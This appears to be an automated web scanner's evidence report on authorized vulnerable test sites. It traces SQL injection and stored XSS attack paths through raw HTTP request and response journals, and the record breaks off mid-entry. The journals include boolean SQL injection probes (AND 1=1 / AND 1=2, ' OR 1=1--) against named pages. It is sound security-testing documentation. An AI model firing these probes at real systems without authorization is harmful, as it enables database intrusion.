# SENTINEL v4.3.0 — L2 Attack Path Intelligence: LIVE EVIDENCE REPORT

Generated from live scan results of the authorized targets (testaspnet, ginjuice, gruyere2, testasp). gruyere2 and testasp are FRESH v4.3.0 live scans (attack paths integrated in the pipeline). testaspnet and ginjuice are v4.3.0 L2 projections over their REAL v4.2.3 live journals (this environment kills background processes and caps foreground calls at 600s; those scans take 936s/620s — the engine is verdict-identical per the gates and L2 is a zero-request pure projection; a fresh ginjuice re-scan attempt overran the window and was discarded). Every path is classified by the weakest-link rule: a path is VERIFIED only when ALL seven links (Identity, Entry, Action, Object, Authorization, State, Impact) trace to verified evidence — finding records, raw request-journal entries, twin rows, scan artifacts. Any inferred link makes the whole path INFERRED and the weak links are named. This report replays the saved journals; it sends zero requests.


**TOTAL: 21 paths — 19 VERIFIED / 2 INFERRED**


## testaspnet — http://testaspnet.vulnweb.com (run run-3d6cf53f93, scanner sentinel-core/4.2.3)

**L2 SOURCE (honesty note): v4.3.0 L2 projection over the v4.2.3 live journal (run-3d6cf53f93, seed f09afb0f) — the engine is verdict-identical (gate verdict-diff vs frozen v4.2.2 = NONE) and L2 is a zero-request pure projection; this environment cannot host a >600s fresh re-scan of this target (measured 936s in the v4.2.3 re-gate)**

**3 paths: 2 VERIFIED / 1 INFERRED** (3 single-finding, 0 chains) — weak-link histogram: `{'impact': 1}`

Seeds used: `F-1e2f9fefe2, F-9779edbacd, F-c9596a7ab3`; non-seed findings (annotation-only classes): `{"F-028c119c10": "missing_security_headers", "F-1142a7221c": "missing_security_headers", "F-1179beef92": "missing_security_headers", "F-13b2c8c2a8": "missing_security_headers", "F-32a08b078e": "missing_security_headers", "F-39effc085b": "missing_security_headers", "F-3a113ff26c": "tech_banner_disclosure", "F-3c3fb037b5": "server_banner_disclosure", "F-460fea73c9": "server_banner_disclosure", "F-605837d876": "server_banner_disclosure", "F-67c25444e0": "tech_banner_disclosure", "F-68f8ce2ff9": "tech_banner_disclosure", "F-6b7f543b49": "tech_banner_disclosure", "F-7ce7cf9eb3": "tech_banner_disclosure", "F-8a1b90f978": "tech_banner_disclosure", "F-8ff2447e2a": "missing_security_headers", "F-929f619d34": "missing_security_headers", "F-9493228d1f": "server_banner_disclosure", "F-97d24e17d0": "server_banner_disclosure", "F-a16bca31ac": "tech_banner_disclosure", "F-a8e5a44043": "tech_banner_disclosure", "F-c05541d788": "tech_banner_disclosure", "F-da42e6ee73": "server_banner_disclosure", "F-e149aac978": "missing_security_headers", "F-e625aa0ffd": "server_banner_disclosure", "F-f14e193287": "server_banner_disclosure", "F-fbb6de6abd": "server_banner_disclosure"}`


### AP-8876b898b5 — VERIFIED — sql_injection at /Comments.aspx — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-c9596a7ab3 | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in  |
| **entry** | verified | GET http://testaspnet.vulnweb.com/Comments.aspx — parameter id |
| **action** | verified | boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes |
| **object** | verified | the SQL query evaluation (a read-capable oracle) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was de |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-f3b98e1c` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 22:58:24 GMT
      content-length: 23962
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>Comments</title>
		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_
  - `journal` ref `req-983f2414` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly`
    REQUEST  GET http://testaspnet.vulnweb.com
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      set-cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 22:57:47 GMT
      content-length: 14044
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>acublog news</title>
		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">
		<meta
  - `finding` ref `F-c9596a7ab3` excerpt: `body-size differential 23962B vs 13310B on condition flip`
    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[ENTRY] — verified**

  GET http://testaspnet.vulnweb.com/Comments.aspx — parameter id

  - `finding` ref `F-c9596a7ab3` excerpt: `body-size differential 23962B vs 13310B on condition flip`
    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-05cdddac` excerpt: `http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1`
    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 22:58:22 GMT
      content-length: 23962
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>Comments</title>
		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_

**[ACTION] — verified**

  boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes

  - `finding` ref `F-c9596a7ab3` excerpt: `verification: oracle:replay-2round (passed=True)`
    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-05cdddac` excerpt: `http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1`
    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 22:58:22 GMT
      content-length: 23962
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>Comments</title>
		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_

**[OBJECT] — verified**

  the SQL query evaluation (a read-capable oracle)

  - `finding` ref `F-c9596a7ab3` excerpt: `body-size differential 23962B vs 13310B on condition flip`
    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-05cdddac` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2+AND+1%3D1
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 22:58:22 GMT
      content-length: 23962
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>Comments</title>
		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">
		<meta name="CODE_
  - `finding` ref `F-c9596a7ab3` excerpt: `body-size differential 23962B vs 13310B on condition flip`
    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-c9596a7ab3` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[IMPACT] — verified**

  Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.

  - `finding` ref `F-c9596a7ab3` excerpt: `impact grade=proven; chain: oracle:replay-2round on GET http://testaspnet.vulnweb.com/Comments.aspx`
    finding: sql_injection GET http://testaspnet.vulnweb.com/Comments.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 23962B vs 13310B on condition flip
      evidence[response_diff]: body-size differential 19213B vs 13310B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

</details>


### AP-a5d1a4b1d8 — VERIFIED — sql_injection at /ReadNews.aspx — single-finding path
*Every link below carries verified evidence. The path is fully proven.*

findings: F-1e2f9fefe2 | chain_rule: — | mitigations absent: []

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in  |
| **entry** | verified | GET http://testaspnet.vulnweb.com/ReadNews.aspx — parameter id |
| **action** | verified | boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes |
| **object** | verified | the SQL query evaluation (a read-capable oracle) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted |
| **state** | verified | no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, |
| **impact** | verified | Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was de |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-56d842f1` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 23:09:00 GMT
      content-length: 13444
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>ReadNews</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="C#
  - `journal` ref `req-983f2414` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly`
    REQUEST  GET http://testaspnet.vulnweb.com
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      set-cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 22:57:47 GMT
      content-length: 14044
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>acublog news</title>
		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">
		<meta
  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 30615B vs 13505B on condition flip`
    finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[ENTRY] — verified**

  GET http://testaspnet.vulnweb.com/ReadNews.aspx — parameter id

  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 30615B vs 13505B on condition flip`
    finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-030bacc1` excerpt: `http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2`
    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 23:08:57 GMT
      content-length: 13444
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>ReadNews</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="C#

**[ACTION] — verified**

  boolean condition injection — the attacker flips the query condition (AND 1=1 vs AND 1=2) and the application's behavior changes

  - `finding` ref `F-1e2f9fefe2` excerpt: `verification: oracle:replay-2round (passed=True)`
    finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2
  - `journal` ref `req-030bacc1` excerpt: `http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2`
    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 23:08:57 GMT
      content-length: 13444
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>ReadNews</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="C#

**[OBJECT] — verified**

  the SQL query evaluation (a read-capable oracle)

  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 30615B vs 13505B on condition flip`
    finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted

  - `journal` ref `req-030bacc1` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
    REQUEST  GET http://testaspnet.vulnweb.com/ReadNews.aspx?id=0+AND+1%3D2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 23:08:57 GMT
      content-length: 13444
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>ReadNews</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="C#
  - `finding` ref `F-1e2f9fefe2` excerpt: `body-size differential 30615B vs 13505B on condition flip`
    finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[STATE] — verified**

  no application state change was involved in the proof (per-request class; verification protocol: non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state change, no destructive payload) — whether the class can cause state changes was not tested

  - `finding` ref `F-1e2f9fefe2` excerpt: `non-destructive verification: fresh-input replay / differential oracle / marker read — no data extraction, no state chan`
    finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

**[IMPACT] — verified**

  Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.

  - `finding` ref `F-1e2f9fefe2` excerpt: `impact grade=proven; chain: oracle:replay-2round on GET http://testaspnet.vulnweb.com/ReadNews.aspx`
    finding: sql_injection GET http://testaspnet.vulnweb.com/ReadNews.aspx param=id status=verified conf=0.95
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      evidence[response_diff]: body-size differential 22848B vs 13444B on condition flip
      evidence[response_diff]: body-size differential 30615B vs 13505B on condition flip
      verification: oracle:replay-2round passed=True conf=0.95 rounds=2

</details>


### AP-fd05eeefa0 — INFERRED — xss_stored at /Comments.aspx — single-finding path
**INFERRED — weak links: impact. The path is NOT presented as proof; the unproven links are named above.**

findings: F-9779edbacd | chain_rule: — | mitigations absent: ["content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy", "content-security-policy"]

| Link | Status | Statement |
|---|---|---|
| **identity** | verified | anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in  |
| **entry** | verified | POST http://testaspnet.vulnweb.com/Comments.aspx — parameter tbComment |
| **action** | verified | canary markup submitted through the real form (all form fields ridden verbatim) and persisted server-side |
| **object** | verified | the persisted message record (the canary survived an independent re-fetch — the record exists server-side) |
| **authorization** | verified | the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted; the submitted form carries no anti-CSRF token field (raw fields: __EVENTTARGET, __EVENTARGUMENT, __ |
| **state** | verified | payload persisted server-side: the canary survived an independent re-fetch on the render surface (engine-observed reflection; the raw journal retains the re-fetch request — its bounded response window does not reach the  |
| **impact** | inferred | defect VERIFIED (canary markup submitted via the real form persisted server-side and rendered RAW on http:/) but the end impact was NOT directly demonstrated (impact grade 'indicated') — the impact claim is inferred from |

<details><summary>raw evidence, link by link</summary>


**[IDENTITY] — verified**

  anonymous web session — cookie ASP.NET_SessionId carried by the raw proving requests; issued by the target on response req-983f2414 (an unauthenticated fetch of a public surface); no Authorization/credential material in any proving request

  - `journal` ref `req-0da52ab0` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
    REQUEST  GET http://testaspnet.vulnweb.com/Comments.aspx?id=2%27+OR+1%3D1--
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
    RESPONSE 200
      cache-control: private
      content-length: 0
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 22:58:24 GMT
  - `journal` ref `req-983f2414` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly`
    REQUEST  GET http://testaspnet.vulnweb.com
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
    RESPONSE 200
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      set-cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp; path=/; HttpOnly
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 22:57:47 GMT
      content-length: 14044
      body[0:200]: 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >
<HTML>
	<HEAD>
		<title>acublog news</title>
		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">
		<meta
  - `finding` ref `F-9779edbacd` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Commen`
    finding: xss_stored POST http://testaspnet.vulnweb.com/Comments.aspx param=tbComment status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
      evidence[stored_xss_surfaces]: render surfaces: http://testaspnet.vulnweb.com/Comments.aspx?id=2
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2

**[ENTRY] — verified**

  POST http://testaspnet.vulnweb.com/Comments.aspx — parameter tbComment

  - `finding` ref `F-9779edbacd` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Commen`
    finding: xss_stored POST http://testaspnet.vulnweb.com/Comments.aspx param=tbComment status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
      evidence[stored_xss_surfaces]: render surfaces: http://testaspnet.vulnweb.com/Comments.aspx?id=2
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
  - `journal` ref `req-0c770c5c` excerpt: `http://testaspnet.vulnweb.com/Comments.aspx?id=2`
    REQUEST  POST http://testaspnet.vulnweb.com/Comments.aspx?id=2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
      body: __EVENTTARGET=sentinel&__EVENTARGUMENT=sentinel&__VIEWSTATE=1%27&__VIEWSTATEGENERATOR=58A73C4D&__EVENTVALIDATION=%2FwEWWQKi3cnWDwKAgcfvBQKFzrr8AQLi%2B%2BjXCAKUl...
    RESPONSE 500
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 23:09:23 GMT
      content-length: 6334
      body[0:200]: <html>
    <head>
        <title>The state information is invalid for this page and might be corrupted.</title>
        <style>
         body {font-family:"Verdana";font-weight:normal;font-size: .

**[ACTION] — verified**

  canary markup submitted through the real form (all form fields ridden verbatim) and persisted server-side

  - `finding` ref `F-9779edbacd` excerpt: `verification: re-test:fresh-canary-resubmit (passed=True)`
    finding: xss_stored POST http://testaspnet.vulnweb.com/Comments.aspx param=tbComment status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
      evidence[stored_xss_surfaces]: render surfaces: http://testaspnet.vulnweb.com/Comments.aspx?id=2
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
  - `journal` ref `req-0c770c5c` excerpt: `tbComment=sentinel`
    REQUEST  POST http://testaspnet.vulnweb.com/Comments.aspx?id=2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
      body: __EVENTTARGET=sentinel&__EVENTARGUMENT=sentinel&__VIEWSTATE=1%27&__VIEWSTATEGENERATOR=58A73C4D&__EVENTVALIDATION=%2FwEWWQKi3cnWDwKAgcfvBQKFzrr8AQLi%2B%2BjXCAKUl...
    RESPONSE 500
      cache-control: private
      content-type: text/html; charset=utf-8
      server: Microsoft-IIS/8.5
      x-aspnet-version: 2.0.50727
      x-powered-by: ASP.NET
      date: Sat, 03 Oct 2026 23:09:23 GMT
      content-length: 6334
      body[0:200]: <html>
    <head>
        <title>The state information is invalid for this page and might be corrupted.</title>
        <style>
         body {font-family:"Verdana";font-weight:normal;font-size: .

**[OBJECT] — verified**

  the persisted message record (the canary survived an independent re-fetch — the record exists server-side)

  - `finding` ref `F-9779edbacd` excerpt: `canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Commen`
    finding: xss_stored POST http://testaspnet.vulnweb.com/Comments.aspx param=tbComment status=verified conf=0.9
      evidence[stored_xss_reflection]: canary markup submitted via the real form persisted server-side and rendered RAW on http://testaspnet.vulnweb.com/Comments.aspx?id=2 — survived an ind
      evidence[stored_xss_surfaces]: render surfaces: http://testaspnet.vulnweb.com/Comments.aspx?id=2
      verification: re-test:fresh-canary-resubmit passed=True conf=0.9 rounds=2
  - `twin` ref `stats.digital_twin.entity_inventory` excerpt: `{"carried_by_params": 1, "consumed_by_steps": [], "entity": "Message", "minted_by_steps": [], "surfaces": ["POST /Commen`
    twin row: {"carried_by_params": 1, "consumed_by_steps": [], "entity": "Message", "minted_by_steps": [], "surfaces": ["POST /Commen

**[AUTHORIZATION] — verified**

  the surface is reachable without authentication: raw proving requests carried no Authorization header and were accepted; the submitted form carries no anti-CSRF token field (raw fields: __EVENTTARGET, __EVENTARGUMENT, __VIEWSTATE, __VIEWSTATEGENERATOR, __EVENTVALIDATION, tbComment)

  - `journal` ref `req-0c770c5c` excerpt: `ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp`
    REQUEST  POST http://testaspnet.vulnweb.com/Comments.aspx?id=2
      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
      Content-Type: application/x-www-form-urlencoded
      Cookie: ASP.NET_SessionId=ugky34ewdvwwibuitx4cnlbp
